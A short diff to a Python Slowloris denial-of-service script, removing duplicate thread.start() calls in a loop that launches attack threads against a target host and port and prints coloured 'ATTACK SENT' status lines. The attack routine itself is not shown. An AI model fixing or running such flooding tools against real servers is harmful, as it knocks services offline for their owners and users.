@@ -59,9 +59,7 @@ def slowloris(target, port, num_threads):
         thread = threading.Thread(target=slowloris_thread, args=(target, port))
         thread.start()
         print(f"\033[32mSTATUS  \033[97mATTACK  \033[92mSENT \033[31m:,{i + 1} \033[0m")
-        thread.start()
         print(f"\033[92mSTATUS  \033[33mATTACK  \033[92mSENT \033[94m::,{i + 1} \033[0m")
-        thread.start()
         print(f"\033[33mSTATUS  \033[96mATTACK  \033[94mSENT  \033[1m:::,,{i + 1} \033[0m")
 if __name__ == "__main__":
     clear()  
